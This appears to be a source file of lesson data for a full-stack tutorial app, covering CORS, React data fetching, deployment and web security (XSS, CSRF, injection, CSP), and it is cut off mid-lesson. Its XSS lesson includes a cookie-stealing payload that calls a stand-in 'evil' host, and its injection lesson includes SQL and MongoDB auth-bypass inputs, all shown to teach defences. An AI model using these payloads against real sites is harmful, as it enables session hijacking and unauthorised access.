// Full-stack track lessons — wiring the two halves together.

const fetchStarter = `import { useState, useEffect } from "react";

// A mock API so this runs offline. Swap for a real fetch('/api/...') in your app.
const fakeApi = () =>
  new Promise((resolve, reject) =>
    setTimeout(() => (Math.random() > 0.15 ? resolve(["Ada", "Grace", "Linus"]) : reject(new Error("Network error"))), 700)
  );

export default function Users() {
  const [state, setState] = useState({ status: "loading", data: null, error: null });

  useEffect(() => {
    let alive = true;                       // guard against setting state after unmount
    fakeApi()
      .then((data) => alive && setState({ status: "success", data, error: null }))
      .catch((error) => alive && setState({ status: "error", data: null, error }));
    return () => { alive = false; };
  }, []);

  if (state.status === "loading") return <p style={s}>⏳ Loading…</p>;
  if (state.status === "error") return <p style={s}>❌ {state.error.message}</p>;
  return (
    <ul style={s}>
      {state.data.map((u) => <li key={u}>{u}</li>)}
    </ul>
  );
}
const s = { fontFamily: "system-ui", padding: 24 };
`

// ---------- fs-security (XSS output-encoding) ----------
const xssStarter = `// XSS DEFENSE #1: OUTPUT ENCODING. Before dropping untrusted text into HTML, escape the characters
// that let it "break out" of text and become markup. This is exactly what React's { } does for you —
// and forgetting it (e.g. dangerouslySetInnerHTML / innerHTML with user data) is how XSS happens.

// Escape the 5 HTML-significant characters. '&' MUST be replaced first (or you double-escape).
function escapeHtml(str) {
  return String(str)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

// A naive template that TRUSTS input -> injectable. Never build HTML from raw user data like this.
function unsafeRender(comment) {
  return "<div class='comment'>" + comment + "</div>";
}

// The safe version escapes the untrusted value first, so it renders as inert text.
function safeRender(comment) {
  return "<div class='comment'>" + escapeHtml(comment) + "</div>";
}

const attack = '<img src=x onerror="steal(document.cookie)">';
console.log("unsafe:", unsafeRender(attack)); // the <img> tag survives -> onerror would fire
console.log("safe:  ", safeRender(attack));   // &lt;img ...&gt; -> shown as text, never executes
`

export const fullstackLessons = [
  // fs-connect
  {
    id: 'fs-cors', module: 'fs-connect', order: 1, kind: 'concept',
    title: 'CORS & the same-origin policy', difficulty: 'medium', tags: ['cors', 'security'],
    summary: 'Why localhost:5173 calling localhost:5000 needs permission — and how to grant it.',
    prompt: `Browsers block a page from reading responses from a **different origin** (protocol + host + port) unless the server opts in with **CORS** headers. That’s why your React app on \`:5173\` needs the API on \`:5000\` to allow it.`,
    keyTerms: [
      { term: 'Origin', def: 'protocol + host + port. http://localhost:5173 and :5000 are DIFFERENT origins.' },
      { term: 'Same-origin policy', def: 'A browser security rule: JS can read responses only from its own origin by default.' },
      { term: 'CORS', def: 'Cross-Origin Resource Sharing — response headers (Access-Control-Allow-Origin) that let the server permit other origins.' },
      { term: 'Preflight', def: 'For non-simple requests the browser first sends an OPTIONS request to check permission.' },
    ],
    explanation: `Two ways to solve it in dev: **enable CORS on the server** (\`app.use(cors())\` — this project does), or **proxy** the API through the dev server so it looks same-origin (this project’s \`vite.config.js\` proxies \`/api\` → \`:5000\`, which is why the client uses relative URLs). In production, serve the frontend and API from the same origin or set a strict allow-list.`,
  },
  {
    id: 'fs-request-lifecycle', module: 'fs-connect', order: 2, kind: 'concept',
    title: 'The request lifecycle, end-to-end', difficulty: 'medium', tags: ['fullstack'],
    summary: 'Follow one click from React through Express, Mongo, and back to the DOM.',
    prompt: `Trace **one action** all the way through a MERN app: a click in React → \`fetch\` → Express route → middleware → Mongoose query → MongoDB → JSON back → state update → re-render.`,
    keyTerms: [
      { term: 'Client', def: 'React in the browser: renders UI, fires fetch, updates state with the response.' },
      { term: 'API layer', def: 'Express: routing, middleware (auth, parsing), calling the data layer.' },
      { term: 'Data layer', def: 'Mongoose models talking to MongoDB.' },
      { term: 'Serialization', def: 'Converting objects to JSON over the wire and back.' },
    ],
    explanation: `Concretely, in this project, marking a lesson complete:
1. \`ProgressContext.toggleComplete\` updates local state **optimistically**.
2. \`lib/api.js\` sends \`POST /api/progress\` with an \`x-user-id\` header.
3. Vite proxies to Express; middleware sets \`req.userId\`; the route \`upsert\`s via the \`Progress\` model.
4. MongoDB persists; a JSON response returns; on failure the UI falls back to its local cache.

Being able to narrate this flow — and where it can fail — is exactly what full-stack interviews test.`,
  },

  // fs-data
  {
    id: 'fs-data-fetching', module: 'fs-data', order: 1, kind: 'component', template: 'react',
    title: 'Fetching data in React', difficulty: 'medium', tags: ['react', 'data'],
    summary: 'Model loading, error, and success as one state machine.',
    prompt: `Every fetch has **three states**: loading, error, success. Model them explicitly (not scattered booleans). The mock randomly fails ~15% of the time — hit Reset to see the error path.`,
    keyTerms: [
      { term: 'Loading/error/success', def: 'The three states of any async request. Render each explicitly.' },
      { term: 'Race condition', def: 'A response arriving after the component moved on. Guard with an "alive" flag or AbortController.' },
      { term: 'Optimistic update', def: 'Update the UI before the server confirms, then roll back on failure (what ProgressContext does).' },
    ],
    starterCode: { '/App.js': fetchStarter },
    explanation: `The subtle bug is the **race**: if the component unmounts (or deps change) before the promise resolves, calling \`setState\` warns/leaks. The \`alive\` flag (or an \`AbortController\`) fixes it. In real apps, libraries like **React Query / SWR** handle caching, revalidation, and dedup so you don’t hand-roll this per screen.`,
  },
  {
    id: 'fs-caching', module: 'fs-data', order: 2, kind: 'concept',
    title: 'Caching, revalidation & optimistic UI', difficulty: 'hard', tags: ['performance', 'ux'],
    summary: 'Make apps feel instant without lying to the user.',
    prompt: `Fast apps **cache** responses and **revalidate** in the background (stale-while-revalidate), and apply **optimistic updates** so the UI reacts before the server confirms.`,
    keyTerms: [
      { term: 'Cache', def: 'Stored responses reused to avoid refetching. Needs an invalidation strategy.' },
      { term: 'Stale-while-revalidate', def: 'Show cached (stale) data immediately, refetch in the background, update when fresh arrives.' },
      { term: 'Optimistic UI', def: 'Apply the expected result instantly; roll back if the server rejects it.' },
      { term: 'Invalidation', def: 'Deciding when cached data is out of date — "the hardest problem in CS".' },
    ],
    explanation: `This app’s \`ProgressContext\` is a small example: it writes to \`localStorage\` and updates state immediately, then POSTs to the server and reconciles. Scale that up with **React Query** (query keys, \`staleTime\`, \`invalidateQueries\`, \`onMutate\` rollbacks). The trade-off is always **freshness vs speed vs complexity** — name it in interviews.`,
  },

  // fs-deploy
  {
    id: 'fs-env', module: 'fs-deploy', order: 1, kind: 'concept',
    title: 'Environments, config & secrets', difficulty: 'easy', tags: ['devops', 'config'],
    summary: 'Keep secrets out of code; change behavior by environment, not by editing source.',
    prompt: `Configuration that differs per environment (dev/staging/prod) or is **secret** (DB URIs, API keys) belongs in **environment variables**, never in committed code.`,
    keyTerms: [
      { term: 'Environment variable', def: 'A value provided at runtime (process.env.X) instead of hard-coded. Set per environment.' },
      { term: '.env file', def: 'A local file of KEY=value pairs loaded in dev (dotenv). Git-ignored; ship a .env.example instead.' },
      { term: 'Secret', def: 'A credential (DB password, API key) that must never be committed or exposed to the client.' },
      { term: 'Build-time vs runtime', def: 'Vite inlines VITE_* vars at build time (public!). Server secrets stay runtime-only.' },
    ],
    explanation: `This project models it: \`server/.env\` (git-ignored) holds \`MONGO_URI\`; \`.env.example\` documents the shape. **Anything prefixed \`VITE_\` is embedded in the client bundle** — never put secrets there. Rotate leaked secrets immediately; they live forever in git history.`,
  },
  {
    id: 'fs-ship', module: 'fs-deploy', order: 2, kind: 'concept',
    title: 'Deploying a MERN app', difficulty: 'medium', tags: ['devops', 'deploy'],
    summary: 'Build the client, run the server, host the DB — and connect them safely.',
    prompt: `Shipping a MERN app: **build** the React client to static files, **host** the Express server, use **managed MongoDB** (Atlas), and wire them with environment config + HTTPS.`,
    keyTerms: [
      { term: 'Static hosting', def: 'The built client (HTML/CSS/JS) served from a CDN (Vercel, Netlify, S3).' },
      { term: 'CI/CD', def: 'Continuous Integration/Delivery — automated test + build + deploy on every push.' },
      { term: 'Managed database', def: 'A hosted DB (MongoDB Atlas) so you don’t run/patch servers yourself.' },
      { term: 'Reverse proxy', def: 'A front server (Nginx) routing / to the client and /api to the backend, terminating HTTPS.' },
    ],
    explanation: `Common shapes: **(a)** client on a CDN + server on a platform (Render/Railway/Fly) + Atlas; **(b)** one Node process serving both the built client and \`/api\`. Either way: set env vars in the host (not \`.env\`), enable HTTPS, lock CORS to your domain, and add a health check. \`npm run build\` in this repo produces the deployable \`client/dist\`.`,
  },

  // ---------- fs-security (Web Security Essentials) ----------
  {
    id: 'fs-sec-sop', module: 'fs-security', order: 1, kind: 'concept',
    title: 'Same-Origin Policy, CORS & sandboxing', difficulty: 'medium', tags: ['security', 'sop', 'cors', 'browser'],
    summary: 'The browser rule that isolates sites by origin — what it blocks, how CORS relaxes it, and how to test an iframe sandbox’s isolation.',
    prompt: `The **same-origin policy (SOP)** is the browser's foundational security boundary, and interviewers love it: *"what's an origin? what does SOP stop? is CORS a security feature?"* An **origin** is the **scheme + host + port** tuple; SOP stops a document from one origin **reading** another origin's DOM, cookies, or storage. **CORS** is how a *server* opts specific cross-origin callers back in. This app's live editors are a working demo: your code runs in an iframe on a **different origin**, so it can't touch the host page (see [SECURITY.md](https://github.com/genepaolo/full-stack-study-gallore/blob/main/SECURITY.md)).`,
    keyTerms: [
      { term: 'Origin (scheme/host/port)', def: 'Two URLs are same-origin only if protocol, host, AND port all match. `https://a.com` ≠ `http://a.com` (scheme), ≠ `https://b.com` (host), ≠ `https://a.com:81` (port).' },
      { term: 'What SOP blocks vs allows', def: 'Blocks cross-origin **reads**: another origin’s DOM, `localStorage`/`IndexedDB`, and cross-origin `fetch` response bodies. Allows **embedding** (`<script>`, `<img>`, `<iframe>`) and **writes** (form posts, navigation) — which is exactly why CSRF exists.' },
      { term: 'CORS', def: 'Cross-Origin Resource Sharing: response headers (`Access-Control-Allow-Origin`, etc.) by which a **server** grants specific other origins read access. CORS *relaxes* SOP — it is not a firewall; it can’t stop a request, only permit the browser to expose the response.' },
      { term: 'postMessage', def: 'The sanctioned channel for cross-origin windows/iframes to talk: `targetWindow.postMessage(data, targetOrigin)`. Always specify (and, on receive, verify) the origin — never trust `event.data` from `"*"`.' },
      { term: 'iframe sandbox', def: 'The `sandbox` attribute drops privileges (scripts, forms, popups) unless re-granted (`allow-scripts`). Without `allow-same-origin` the frame gets an **opaque origin** — cross-origin to everything, the strongest isolation.' },
    ],
    codeNotes: [
      { label: 'Origin comparison (say this in an interview)', code: `// baseline: https://shop.com:443/cart\nhttps://shop.com/account   // ✅ same origin (path doesn't matter)\nhttp://shop.com/cart       // ❌ different SCHEME\nhttps://api.shop.com/cart  // ❌ different HOST (subdomain counts)\nhttps://shop.com:8443/cart // ❌ different PORT`, note: "Origin = scheme + host + port. Subdomains and http/https differ." },
      { label: 'CORS: the server opts callers in', code: `// Express: allow just your frontend to READ responses cross-origin\napp.use(cors({ origin: "https://app.shop.com", credentials: true }));\n// The browser enforces it; a non-browser client (curl) ignores CORS entirely.`, note: "CORS is browser-enforced permission, not server-side access control." },
      { label: 'Probe an iframe sandbox (defensive test)', code: `// Paste inside a sandboxed/cross-origin iframe and watch the console:\ntry { parent.localStorage.getItem("token"); }   // reading host storage\ncatch (e) { console.log("BLOCKED:", e.message); } // -> SecurityError = isolated\nconsole.log(document.domain, document.cookie);    // sandbox origin, empty cookie`, note: "If those throw / come back empty, the origin boundary is holding." },
    ],
    explanation: `**The one-sentence definition:** the same-origin policy lets a page freely use resources from its
**own origin** (scheme + host + port) but restricts how it can **read** from a *different* origin — "it helps
isolate potentially malicious documents, reducing possible attack vectors" (MDN). Concretely it blocks reading
another origin's **DOM**, its **\`localStorage\`/\`IndexedDB\`** ("JavaScript in one origin cannot read from or
write to the storage belonging to another origin"), and the **response body** of a cross-origin \`fetch\`.

**What it does *not* block is the interview trap:** cross-origin **embedding and writes are allowed** — you can
\`<script src>\` another origin, \`<img>\` it, or **POST a form to it**. That "sending is allowed, reading is
blocked" asymmetry is the root of **CSRF** (a later lesson): the attacker can *send* an authenticated request,
they just can't *read* the reply.

**CORS is the opt-in, and its direction matters.** By default SOP hides a cross-origin response from your JS;
**CORS** is the *server* saying (via \`Access-Control-Allow-Origin\`) "this specific origin may read my
responses." Key interview points: CORS **relaxes** SOP rather than tightening it, it's **enforced by the
browser** (a \`curl\`/server-side call ignores it), and it is **not** an authorization mechanism — a wildcard
\`Access-Control-Allow-Origin: *\` with credentials is a classic misconfiguration.

**Tie-in to this app (and how to *test* isolation):** every live editor runs your code in an iframe served
from a **different origin**, so SOP makes it unable to read the host page's DOM, React state, or \`localStorage\`.
You can verify that yourself — paste the probe in the codeNotes and watch \`parent.localStorage\` throw a
\`SecurityError\`. That empirical "does the boundary actually hold?" habit is exactly what a security-minded
engineer brings. *Sources: [MDN — Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy),
[MDN — CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS).*`,
  },
  {
    id: 'fs-sec-xss', module: 'fs-security', order: 2, kind: 'utility', template: 'vanilla',
    title: 'Cross-Site Scripting (XSS)', difficulty: 'medium', tags: ['security', 'xss', 'owasp'],
    summary: 'Injecting script into a trusted page. Know the three types and the layered defense: output-encode, validate input, and add a CSP.',
    prompt: `**XSS** is "a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites" (OWASP). Injected script runs with the victim page's privileges — it can "access any cookies, session tokens, or other sensitive information" and "rewrite the content of the HTML page." The core defense is **output encoding**: escape untrusted data before it enters HTML. Implement \`escapeHtml\` in the editor and watch it neutralize an \`onerror\` payload.`,
    keyTerms: [
      { term: 'Reflected XSS', def: 'Malicious script comes in a request (a crafted URL/link) and is echoed straight back in the response — "delivered to victims via another route, such as an e-mail message" (OWASP).' },
      { term: 'Stored (persistent) XSS', def: 'The script is saved on the server ("in a database, message forum, comment field") and runs for every user who later views it. The most damaging type.' },
      { term: 'DOM-based XSS', def: 'Entirely client-side: JS reads attacker-controlled input (`location.hash`, a query param) and writes it to a dangerous sink (`innerHTML`, `document.write`) without encoding.' },
      { term: 'Output encoding (the main defense)', def: 'Escape HTML-significant characters (`& < > " \'`) before inserting untrusted data into markup, so it renders as text, not tags. Context matters: HTML vs attribute vs JS vs URL each need different encoding.' },
      { term: 'Dangerous sinks', def: '`innerHTML`, `dangerouslySetInnerHTML`, `document.write`, `eval`, inline event handlers. React escapes `{}` by default — you lose that protection the moment you use `dangerouslySetInnerHTML`.' },
      { term: 'Defense in depth', def: 'Encode output + validate input (allowlist) + set a Content-Security-Policy. OWASP: sanitize *and* set a CSP — CSP is the backstop if encoding is missed.' },
    ],
    codeNotes: [
      { label: 'The escape function (what frameworks do for you)', code: `const escapeHtml = (s) => String(s)\n  .replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;")\n  .replaceAll('"',"&quot;").replaceAll("'","&#39;");\n// "<script>" -> "&lt;script&gt;"  (renders as text, never runs)`, note: "& is escaped first, or you'd double-encode the others." },
      { label: 'The bug: untrusted data in a dangerous sink', code: `// ❌ DOM-based XSS — attacker controls location.hash\nel.innerHTML = decodeURIComponent(location.hash.slice(1));\n// ❌ React escape hatch with user data\n<div dangerouslySetInnerHTML={{ __html: userComment }} />\n// ✅ let React render it as text:  <div>{userComment}</div>`, note: "Prefer textContent / JSX text; sanitize (DOMPurify) if you must render HTML." },
      { label: 'CSP as the backstop', code: `Content-Security-Policy: default-src 'self'; script-src 'self'\n// blocks inline <script>, onerror=, and javascript: URLs —\n// so an injected payload won't execute even if encoding was missed.`, note: "Defense in depth: CSP catches what output-encoding misses." },
    ],
    starterCode: { '/index.js': xssStarter },
    explanation: `**XSS is an *injection* bug** — the browser can't tell your intended markup from an attacker's
because both arrived as the same string. If a comment like \`<img src=x onerror="fetch('//evil/?c='+document.cookie)">\`
is written into the page unescaped, the browser runs it **as the victim**, with their session — hence session
hijacking and credential theft. The three flavors differ only in *how the payload arrives*: **reflected**
(bounced off a request), **stored** (persisted server-side, runs for everyone), and **DOM-based** (never
touches the server — client JS pipes input into a sink).

**The defense is layered, and output encoding is the primary layer.** *Encode on output*: escape the
HTML-significant characters right before inserting untrusted data, so \`<script>\` becomes inert text — that's
the \`escapeHtml\` in the editor, and it's exactly what **React's \`{}\` does automatically**. You forfeit that
protection with \`dangerouslySetInnerHTML\`/\`innerHTML\`; if you truly must render user HTML, run it through a
sanitizer like **DOMPurify**. *Validate on input* with an allowlist as a second layer. Then set a
**Content-Security-Policy** as the backstop (next-but-one lesson): OWASP's guidance is to **sanitize input
*and* set a CSP** — defense in depth, so one missed spot isn't game over.

**Interview-ready framing:** "XSS runs attacker JS in my origin. I prevent it by encoding output for its
context (React handles this unless I use \`dangerouslySetInnerHTML\`), validating input, and adding a CSP that
forbids inline script." Run the editor to see \`safeRender\` turn the \`onerror\` payload into harmless text.
*Sources: [OWASP — Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/),
[OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).*`,
  },
  {
    id: 'fs-sec-csrf', module: 'fs-security', order: 3, kind: 'concept',
    title: 'CSRF & SameSite cookies', difficulty: 'medium', tags: ['security', 'csrf', 'cookies', 'owasp'],
    summary: 'Tricking an authenticated browser into sending a state-changing request. Defend with SameSite cookies, anti-CSRF tokens, and Origin checks.',
    prompt: `**CSRF** "forces an end user to execute unwanted actions on a web application in which they're currently authenticated" (OWASP). It works because "browser requests automatically include any credentials associated with the site, such as the user's session cookie" — so a form auto-submitted from \`evil.com\` rides your logged-in cookie to \`bank.com\`. The server "has no way to distinguish between the forged request... and a legitimate request." The modern first-line defense is the **\`SameSite\`** cookie attribute; the classic one is an **anti-CSRF token**.`,
    keyTerms: [
      { term: 'CSRF (the mechanism)', def: 'The attacker page issues a cross-site request (auto-submitting form / img src) to a site where the victim is logged in. The browser attaches the victim’s cookie automatically → the action runs as them.' },
      { term: 'Why it targets state changes', def: '"CSRF attacks target functionality that causes a state change" — transfer money, change email/password. SOP still blocks *reading* the response; the damage is in the *write*.' },
      { term: 'SameSite=Lax (modern default)', def: 'Cookies are sent on top-level navigations but withheld from cross-site sub-requests (an evil form POST). Browsers now treat a cookie with no SameSite as `Lax`, which blocks the classic CSRF POST.' },
      { term: 'SameSite=Strict / None', def: '`Strict` sends the cookie only in a first-party context (max protection, can break inbound links). `None` allows cross-site sending but **must** be paired with `Secure` (HTTPS).' },
      { term: 'Anti-CSRF (synchronizer) token', def: 'A per-session/per-request secret embedded in forms and verified server-side. The attacker’s page can’t read it (SOP), so it can’t forge a valid request. Most frameworks ship this built-in.' },
      { term: 'HttpOnly & Secure flags', def: '`HttpOnly` hides the cookie from JavaScript (limits XSS cookie theft); `Secure` sends it only over HTTPS. Combine with `SameSite` for session cookies.' },
    ],
    codeNotes: [
      { label: 'Harden the session cookie', code: `res.cookie("sid", id, {\n  httpOnly: true,   // JS can't read it (XSS mitigation)\n  secure: true,     // HTTPS only\n  sameSite: "lax",  // withheld from cross-site sub-requests (CSRF)\n});`, note: "SameSite=Lax + HttpOnly + Secure covers most session-cookie needs." },
      { label: 'Anti-CSRF token (double protection)', code: `// server: render a per-session token into the form / send in a cookie+header pair\n<input type="hidden" name="_csrf" value={token} />\n// server verifies req.body._csrf === session token; attacker can't read it (SOP)`, note: "Use for cookie-auth state changes; frameworks (csurf, Django, Rails) build it in." },
      { label: 'XSS vs CSRF — the interview contrast', code: `// XSS  = attacker runs THEIR script in YOUR origin (a read+write breach)\n// CSRF = attacker makes YOUR browser send an authed WRITE (no read)\n// Note: XSS defeats CSRF tokens (it can read the token) -> fix XSS first.`, note: "They're different bugs; XSS is strictly worse and undermines CSRF defenses." },
    ],
    explanation: `**CSRF exploits *ambient authority*.** Because the browser attaches your \`bank.com\` session
cookie to *any* request to \`bank.com\` — even one triggered by a hidden form on \`evil.com\` — the bank sees a
perfectly valid, authenticated request and can't tell it wasn't you. Note the asymmetry from the SOP lesson:
the attacker can **send** the request but SOP still stops them **reading** the response, so CSRF is about
forcing **state changes** (change password, transfer funds), not stealing data.

**Defense today is layered, cookie-attribute-first:**
- **\`SameSite\`** — the browser withholds the cookie from cross-site sub-requests. \`Lax\` (now the **default**
  when unset) already blocks the classic cross-site form POST; \`Strict\` is stronger but can break inbound
  links; \`None\` re-enables cross-site sending and **must** be \`Secure\`.
- **Anti-CSRF (synchronizer) token** — a secret in the form/header that the server checks. The attacker's
  page can't read it (SOP), so it can't forge a valid request. Most frameworks include this; **check if your
  framework has built-in CSRF protection and use it** (OWASP Cheat Sheet).
- Verify the **\`Origin\`/\`Referer\`** header for sensitive actions, and require re-auth for the most critical
  ones. OWASP notes "HTTPS should be considered a prerequisite" for any of this to be trustworthy.

**One trap to state out loud:** **token-auth in an \`Authorization\` header isn't automatically attached
cross-site, so it's largely immune to CSRF** — CSRF is a *cookie-session* problem. And **XSS trumps CSRF**: if
you have XSS, the attacker can read the CSRF token, so fix XSS first. *Sources:
[OWASP — CSRF](https://owasp.org/www-community/attacks/csrf),
[web.dev — SameSite cookies explained](https://web.dev/articles/samesite-cookies-explained),
[OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).*`,
  },
  {
    id: 'fs-sec-injection', module: 'fs-security', order: 4, kind: 'concept',
    title: 'Injection (SQL & NoSQL)', difficulty: 'medium', tags: ['security', 'injection', 'sql', 'mongodb'],
    summary: 'Untrusted input changing the meaning of a query. The fix is parameterization — never concatenate input into a query.',
    prompt: `**Injection** happens when "untrusted data... is used to dynamically construct a SQL query" (OWASP) — the input crosses from the *data* plane into the *control* plane and changes what the query does. It's **A05 in the OWASP Top 10 (2025)**. A successful attack can "read sensitive data, modify database data, execute administration operations," and bypass auth. The one durable fix: **parameterized queries** — send code and data separately so input can never become code. MongoDB has its own flavor (**NoSQL/operator injection**).`,
    keyTerms: [
      { term: 'SQL injection', def: 'Input concatenated into SQL alters its logic. Classic auth bypass: a password field of `\' OR \'1\'=\'1` turns `WHERE pass = \'...\'` into an always-true clause.' },
      { term: 'Parameterized queries / prepared statements', def: 'The #1 defense (OWASP). The query text has placeholders (`?`/`$1`); the driver sends values separately, so input is always treated as data, never executed as SQL.' },
      { term: 'NoSQL / operator injection', def: 'In MongoDB, unsanitized input can smuggle query operators: a JSON body `{"password": {"$ne": null}}` makes `find({ password: req.body.password })` match any password. Coerce/validate types; never pass raw request objects into a query.' },
      { term: 'Allowlist input validation', def: 'Validate against known-good patterns (a second layer). OWASP: "deny listing is riddled with loopholes" — prefer allowlists. Not a substitute for parameterization.' },
      { term: 'Least privilege', def: 'The DB account the app uses should have only the rights it needs (no DROP/admin). Limits the blast radius if injection still gets through — defense in depth.' },
      { term: 'ORM/ODM caveat', def: 'Mongoose/Prisma parameterize by default, but raw queries (`$where`, `db.$queryRawUnsafe`, string-built filters) reopen the hole. Type your inputs and avoid the raw escape hatches with user data.' },
    ],
    codeNotes: [
      { label: 'SQL: concatenation vs parameterized', code: `// ❌ injectable — input becomes part of the SQL\ndb.query("SELECT * FROM users WHERE email = '" + email + "'");\n// ✅ parameterized — driver sends value separately\ndb.query("SELECT * FROM users WHERE email = $1", [email]);`, note: "The placeholder guarantees input is data, never executable SQL." },
      { label: 'NoSQL operator injection (MongoDB)', code: `// ❌ if req.body.password is { "$ne": null }, this matches ANY user\nUser.findOne({ email, password: req.body.password });\n// ✅ coerce to a primitive so an operator object can't sneak in\nUser.findOne({ email, password: String(req.body.password) });`, note: "Validate/type request data; never trust its shape. Ties to the Mongo module." },
      { label: 'Least privilege limits the damage', code: `// app DB user: SELECT/INSERT/UPDATE on app tables only —\n// no DROP, no admin, no access to other schemas.`, note: "If injection slips through, a locked-down account contains it." },
    ],
    explanation: `**Every injection bug is the same root cause: input that should be *data* gets interpreted as
*code*.** SQL can't "distinguish between control and data planes" (OWASP), so a value spliced into the query
string can rewrite the query — the textbook auth bypass turns \`WHERE password = '<input>'\` into an
always-true condition and logs the attacker in as anyone.

**The fix is not "escape quotes" — it's parameterization.** With a **prepared statement**, the query text
(with \`?\`/\`$1\` placeholders) is sent to the database *separately* from the values, so user input is *always*
bound as data and can never change the query's structure. OWASP calls parameterized queries the most
effective defense; **allowlist validation** and **least-privilege DB accounts** are defense-in-depth layers
on top, not replacements.

**Don't forget NoSQL.** MongoDB doesn't build SQL strings, but it has **operator injection**: pass a raw
request value straight into a filter and an attacker can send \`{ "$ne": null }\` or \`{ "$gt": "" }\` to match
records they shouldn't — the exact hazard flagged in the MongoDB CRUD lesson. Coerce inputs to the expected
primitive type, validate the shape, and avoid raw escape hatches (\`$where\`, unsafe raw queries) with user
data. Mongoose/Prisma parameterize by default, which is a strong reason to prefer them over hand-built
queries. *Sources: [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection),
[OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html).*`,
  },
  {
    id: 'fs-sec-headers', module: 'fs-security', order: 5, kind: 'concept',
    title: 'CSP & security headers', difficulty: 'medium', tags: ['security', 'csp', 'headers', 'clickjacking'],
    summary: 'A few response headers close whole vulnerability classes: CSP (XSS/clickjacking), HSTS (HTTPS), plus the cookie and frame protections.',
    prompt: `Some of the highest-leverage security is a handful of **response headers**. **Content-Security-Policy (CSP)** is the headline: "a series of instructions from a website to a browser... to place restrictions on the things that the code... is allowed to do" (MDN) — chiefly *which scripts may run*, which is why it's such a strong **XSS** backstop. Pair it with **HSTS**, frame protections, and the cookie flags for broad coverage with little code.`,
    keyTerms: [
      { term: 'Content-Security-Policy', def: 'An allowlist for resource loading, sent as a response header. `script-src \'self\'` means only same-origin scripts run; it blocks inline `<script>`, `onerror=`, and `javascript:` URLs by default.' },
      { term: 'CSP nonces / hashes', def: 'To allow a *specific* inline script, give it a per-response random `nonce` (or a `sha256-` hash) referenced in the policy. Avoid `\'unsafe-inline\'`, which "defeats much of the purpose of having a CSP" (MDN).' },
      { term: 'frame-ancestors (anti-clickjacking)', def: '`frame-ancestors \'none\'` (or specific origins) controls who may embed your page in an iframe — "effective protection against clickjacking." The modern replacement for `X-Frame-Options`.' },
      { term: 'Clickjacking', def: 'Framing your site invisibly over attacker UI so the victim’s clicks hit your app (e.g. a hidden “confirm” button). Defeated by `frame-ancestors` / `X-Frame-Options: DENY`.' },
      { term: 'HSTS (Strict-Transport-Security)', def: 'Tells the browser to use HTTPS only for your domain going forward, defeating downgrade/SSL-strip attacks. Pair with redirecting all HTTP to HTTPS.' },
      { term: 'The rest of the set', def: '`X-Content-Type-Options: nosniff` (stop MIME-sniffing), `Referrer-Policy` (limit referrer leakage), and cookie flags `HttpOnly`/`Secure`/`SameSite`. Libraries like **helmet** (Express) set sane defaults.' },
    ],
    codeNotes: [
      { label: 'A starter CSP (defense in depth for XSS)', code: `Content-Security-Policy:\n  default-src 'self';\n  script-src 'self';           // no inline/3rd-party JS\n  object-src 'none';           // no <object>/<embed>\n  frame-ancestors 'none';      // can't be iframed (anti-clickjacking)\n  base-uri 'self';`, note: "Blocks the most common XSS vectors even if output-encoding is missed." },
      { label: 'Allow one inline script safely (nonce)', code: `Content-Security-Policy: script-src 'nonce-r4nd0m'\n<script nonce="r4nd0m">/* allowed */</script>\n// the nonce must be random and DIFFERENT on every response.`, note: "Nonces/hashes let you keep a strict CSP without 'unsafe-inline'." },
      { label: 'Express: sane defaults in one line', code: `import helmet from "helmet";\napp.use(helmet());   // sets CSP*, HSTS, nosniff, frame protection, etc.\n// (*review helmet's default CSP and tailor script-src to your app)`, note: "helmet ships a reasonable baseline; tune the CSP to your assets." },
    ],
    explanation: `**Headers are cheap, high-coverage security.** The centerpiece is **CSP**: because most XSS
executes injected **inline** script, a policy of \`script-src 'self'\` (which blocks inline \`<script>\`, inline
\`onerror=\` handlers, and \`javascript:\` URLs unless you opt them in with a **nonce** or **hash**) stops an
injected payload from running *even if your output-encoding missed a spot*. That's why OWASP frames it as
**defense in depth — "sanitize input *and* set a CSP,"** not one or the other. The trap to avoid is
\`'unsafe-inline'\`, which re-opens the exact hole CSP exists to close.

The supporting cast each closes a class of bug: **\`frame-ancestors\`** stops **clickjacking** (an attacker
invisibly framing your page over their own UI); **HSTS** forces HTTPS and defeats downgrade attacks;
**\`X-Content-Type-Options: nosniff\`** stops MIME-sniffing tricks; and the **\`HttpOnly\`/\`Secure\`/\`SameSite\`**
cookie flags harden sessions (from the CSRF lesson). In practice you don't hand-roll these — a library like
**helmet** for Express sets a sensible baseline, and you tailor the CSP \`script-src\` to your app's real
assets.

**Interview-ready:** "CSP is my XSS backstop — \`script-src 'self'\`, nonces for any inline script, never
\`unsafe-inline\`. I add \`frame-ancestors\` for clickjacking, HSTS for transport, nosniff, and the secure
cookie flags — usually via helmet." *Sources:
[MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP),
[OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/).*`,
  },
  {
    id: 'fs-sec-owasp', module: 'fs-security', order: 6, kind: 'concept',
    title: 'The OWASP Top 10 — a full-stack checklist', difficulty: 'medium', tags: ['security', 'owasp', 'checklist', 'interview'],
    summary: 'The industry-standard list of the most critical web app risks (2025) — and, for each, the one thing a full-stack dev does about it.',
    prompt: `The **OWASP Top 10** is the industry's consensus list of the most critical web-application security risks — the vocabulary interviewers expect you to recognize. You don't need to memorize all ten cold, but you should be able to *name a few, place the ones you've learned, and say what you'd do about them*. Here's the **2025** list with a one-line "what a full-stack dev does" for each, plus vetted resources to go deeper.`,
    keyTerms: [
